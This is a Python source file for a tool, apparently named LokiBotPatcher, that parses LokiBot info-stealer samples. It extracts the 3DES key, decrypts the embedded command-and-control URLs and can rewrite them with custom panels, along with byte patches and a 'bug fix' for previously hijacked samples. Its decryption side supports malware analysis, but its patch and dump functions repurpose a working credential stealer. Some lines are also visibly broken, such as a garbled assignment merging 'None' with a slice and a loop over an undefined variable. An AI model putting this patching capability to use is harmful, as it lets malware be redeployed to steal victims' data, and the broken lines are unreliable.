#!/usr/bin/env python
# -*- coding: ascii -*-

"""
This module implements LokiBotPatcher class.

LokiBotPatcher class is able for parsing a LokiBot malware sample.

LokiBotPatcher extracts control panels from a LokiBot malware sample and
the 3DES key used for encrypting those control panels.

LokiBotPatcher can be used for rewriting LokiBot malware control panels
with custom control panels.

Also, with LokiBotPatcher, some bugs are fixed to all those LokiBot samples
which were patched before by 'Dimitry'

DISCLAIMER
Any actions and or activities related to the material contained within this script is solely your responsibility.
The misuse of the information in this script can result in criminal charges brought against the persons in question.
The author will not be held responsible in the event any criminal charges be brought against any individuals misusing the information in this script to break the law.
"""

__author__  = 'd00rt (@D00RT_RM)'
__email__   = 'd00rt.fake@gmail.com'
__date__    = '30-06-2018'
__version__ = '1.0'


import os
import yara
import pefile
import string
import struct
import StringIO
from capstone import *
from Crypto.Cipher import DES3
from optparse import OptionParser, OptionValueError


class ExceptionItIsNotLokiBot(Exception):
    pass


class LokiBotPatcher:
    _PE                             = None
    DATA                            = None

    YARA_RULES                      = None
    YARA_RULES_MATCHES              = None

    PATCHED_VERSION                 = False
    OFFSET_PATCH_VERSION_1          = None
    OFFSET_PATCH_VERSION_2          = None
    PATCHED_VERSION_CNC_URL         = None

    CNC_URLS_3DES                   = None
    VA_CNC_URLS_3DES                = []
    MAX_CNC_URL_SIZE                = 0
    MAX_CNC_URL_NUM                 = 0

    _3DES_IV                        = None
    RVA_3DES_IV                     = None
    _3DES_KEY                       = None
    RVA_3DES_KEY                    = []


    def __init__(self, target_file, yara_rules):
        if not os.path.exists( target_file ):
            raise Exception( "LokiBot target file {f} doesn't exist.".format( f=target_file ) )

        if not os.path.exists( yara_rules ):
            raise Exception("LokiBot yara file {f} doesn't exist.".format( f=yara_rules ) )

        self._PE = pefile.PE(target_file)
        self.YARA_RULES = yara.compile(yara_rules)

        with open(target_file, "rb") as f:
            self.DATA = f.read()
            self.YARA_RULES_MATCHES = self.YARA_RULES.match(data=self.DATA)

        if not self.YARA_RULES_MATCHES:
            raise ExceptionItIsNotLokiBot("The target file it is not a LokiBot sample.")

        for m in self.YARA_RULES_MATCHES:
                
            for s in m.strings:
                if m.rule == "LokiBotPatch":
                    self.PATCHED_VERSION = True
                    if s[1] == "$h1":
                        self.OFFSET_PATCH_VERSION_1 = s[0] + 37

                    if s[1] == "$h2":
                        self.OFFSET_PATCH_VERSION_2 = s[0] + 48

        self.load_cnc_urls()


    def normalize_string(self, s):
        printable = set(string.printable)
        return filter(lambda x: x in printable, s)


    def rva_to_offset(self, rva):
        offset = -1
        for section in self._PE.sections:
            if rva >= section.VirtualAddress and rva <= (section.VirtualAddress + section.Misc_VirtualSize):
                offset = rva - section.VirtualAddress + section.PointerToRawData
                return offset

        return offset


    def get_raw_offset_from_va(self, offset):
        rva = offset - self._PE.OPTIONAL_HEADER.ImageBase
        return self.rva_to_offset(rva)


    def get_3des_key_offsets(self, buff):
        fs = StringIO.StringIO(buff)
        fs.read(15)
        key_iv = struct.unpack("=L", fs.read(4))[0]
        fs.read(10)
        key_3 = struct.unpack("=L", fs.read(4))[0]
        fs.read(1)
        key_2 = struct.unpack("=L", fs.read(4))[0]
        fs.read(1)
        key_1 = struct.unpack("=L", fs.read(4))[0]

        return key_iv, key_1, key_2, key_3


    def get_3des_key(self, buff):
        offsets = self.get_3des_key_offsets(buff)
        key = []

        data = self.DATA
        for offset in offsets:
            raw_offset = self.get_raw_offset_from_va(offset)
            key.append(data[raw_offset: raw_offset + 0x8])

        self._3DES_IV = key[0]
        self._3DES_KEY = key[1] + key[2] + key[3]

        return key


    def get_string_from_offset(self, offset):
        s = ''
        i = 0
        data = str(self.DATA)
        while offset + i < len(data) and data[offset + i] != '\x00':
            s += data[offset + i]
            i += 1

        return s


    def get_offset_nearest_match_from_keys(self, a_oh_1, oh_2):
        if not a_oh_1:
            return -1

        dist = abs(a_oh_1[0][0] - oh_2)
        r_match_offset = a_oh_1[0][0]
        i = 1
        while i < len(a_oh_1):
            aux_dist = abs(a_oh_1[i][0] - oh_2)
            if aux_dist < dist:
                dist = aux_dist
                r_match_offset = a_oh_1[i][0]
            i += 1

        return r_match_offset


    def get_3des_url_offsets(self, buff):
        o_urls = []
        md = Cs(CS_ARCH_X86, CS_MODE_32)
        for i in md.disasm(str(buff), 0x1000):

            # discard rep movsd dword ptr es:[edi], dword ptr [esi]
            if i.mnemonic == "mov" and len(i.bytes) == 5 and "esi" in i.op_str:
                o_urls.append(struct.unpack("=L", i.bytes[1:])[0])

        return o_urls


    def get_3des_urls(self, buff):

        offsets = self.get_3des_url_offsets(buff)
        self.VA_CNC_URLS_3DES = offsets
        self.MAX_CNC_URL_SIZE = abs(offsets[0] - offsets[1])
        self.MAX_CNC_URL_NUM = len(offsets)

        e_urls = []
        for offset in offsets:
            raw_offset = self.get_raw_offset_from_va(offset)
            url = self.get_string_from_offset(raw_offset)
            if url:
                e_urls.append(url)

        return e_urls


    def decrypt_3des_url(self, encrypted_url, deskey=None, iv=None):
        if not deskey:
            deskey = self._3DES_KEY
        if not iv:
            iv = self._3DES_IV

        cipher_decrypt = DES3.new(str(deskey), DES3.MODE_CBC, str(iv))
        return self.normalize_string(cipher_decrypt.decrypt(str(encrypted_url)))


    def decrypt_3des_urls(self, encrypted_urls, deskey=None, iv=None):
        if not deskey:
            deskey = self._3DES_KEY
        if not iv:
            iv = self._3DES_IV

        urls = []
        for e_url in encrypted_urls:
            urls.append(self.decrypt_3des_url(e_url, deskey, iv))
        return urls


    def encrypt_3des_url(self, url, deskey=None, iv=None):
        if not deskey:
            deskey = self._3DES_KEY
        if not iv:
            iv = self._3DES_IV

        cipher_encrypt = DES3.new(str(deskey), DES3.MODE_CBC, str(iv))
        return cipher_encrypt.encrypt(str(url))


    def encrypt_3des_urls(self, urls, deskey=None, iv=None):
        if not deskey:
            deskey = self._3DES_KEY
        if not iv:
            iv = self._3DES_IV

        urls = []
        for e_url in encrypted_urls:
            urls.append(self.encrypt_3des_url(e_url, deskey, iv))
        return urls


    def decrypt_url(self, e_url, key):
        return ''.join([chr(ord(c) ^ key) for c in e_url])


    def load_patched_version_cnc_url(self):
        last_section = self._PE.sections[self._PE.FILE_HEADER.NumberOfSections - 1]
        url_va = struct.unpack("=L", last_section.get_data()[0x1C: 0x1C + 0x04])[0]
        url_offset = self.get_raw_offset_from_va(url_va)
        url_xored = self.get_string_from_offset(url_offset)
        self.PATCHED_VERSION_CNC_URL = self.decrypt_url(url_xored, 0xFF)


    def load_cnc_urls(self):
        if self.PATCHED_VERSION and not self.PATCHED_VERSION_CNC_URL:
            self.load_patched_version_cnc_url()

        a_oh_1 = []
        oh_2 = None
        for m in self.YARA_RULES_MATCHES:
            if m.rule == "LokiBot3DESKey":
                for s in m.strings:
                    if s[1] == "$h1":
                        a_oh_1.append(s)

                    if s[1] == '$h2':
                        oh_2 = s[0]
                        iv, k1, k2, k3 = self.get_3des_key(s[2])
                        if not iv or not k1 or not k2 or not k3:
                            self._3DES_IV = Noneself.DATA[urls_match_offset: urls_match_offset + urls_block_size]
                            self._3DES_KEY = None

        if not self._3DES_KEY or not self._3DES_IV:
            return False

        urls_match_offset = self.get_offset_nearest_match_from_keys(a_oh_1, oh_2)
        urls_block_size = abs(urls_match_offset - oh_2)

        encrypted_3des_urls = self.get_3des_urls(self.DATA[urls_match_offset: urls_match_offset + urls_block_size])
        self.CNC_URLS_3DES = self.decrypt_3des_urls(encrypted_3des_urls)

        return True


    def reset_3des_urls(self):
        if not self.VA_CNC_URLS_3DES:
            return False

        i = 0
        for o in self.VA_CNC_URLS_3DES:
            raw_offset = self.get_raw_offset_from_va(o)
            self._PE.set_bytes_at_offset(raw_offset, "\x00" * len(self.CNC_URLS_3DES[i]))
            i += 1

        self.DATA = self._PE.write()


    def delete_last_section(self):
        last_section = self._PE.sections[self._PE.FILE_HEADER.NumberOfSections - 1]
        self._PE.OPTIONAL_HEADER.SizeOfImage -= last_section.Misc_VirtualSize
        self._PE.FILE_HEADER.NumberOfSections -= 1

        return self._PE.write()[:last_section.PointerToRawData]


    def patch_3des_url(self, offset, url):
        raw_offset = self.get_raw_offset_from_va(offset)
        self._PE.set_bytes_at_offset(raw_offset, self.encrypt_3des_url(url))


    def patch_version(self):
        self._PE.set_bytes_at_offset(self.OFFSET_PATCH_VERSION_1, "\x85\xC0\x74\x02\x8B\x37")
        self._PE.set_bytes_at_offset(self.OFFSET_PATCH_VERSION_2, "\x88\x1C\x30")
        return self.delete_last_section()


    def patch(self, new_cnc_urls):
        if type(new_cnc_urls) == str:
            new_cnc_urls = new_cnc_urls.split(',')

        if self.MAX_CNC_URL_NUM < len(new_cnc_urls):
            return None

        discarded_urls = []

        self.reset_3des_urls()
        i = 0
        for u in new_cnc_urls:
            u += "\x00"
            res = len(u) % 8
            u = u + chr(8 - res) * (8 - res)
            if len(u) < self.MAX_CNC_URL_SIZE:
                self.patch_3des_url(self.VA_CNC_URLS_3DES[i], u)
            else:
                discarded_urls.append(u)

            i += 1

        if self.PATCHED_VERSION:
            self.DATA = self.patch_version()
        else:
            self.DATA = self._PE.write()

        self.load_cnc_urls()
        return discarded_urls


    def dump(self, filename=None):
        if not filename:
            return self.DATA

        with open(filename, "wb") as f:
            f.write(self.DATA)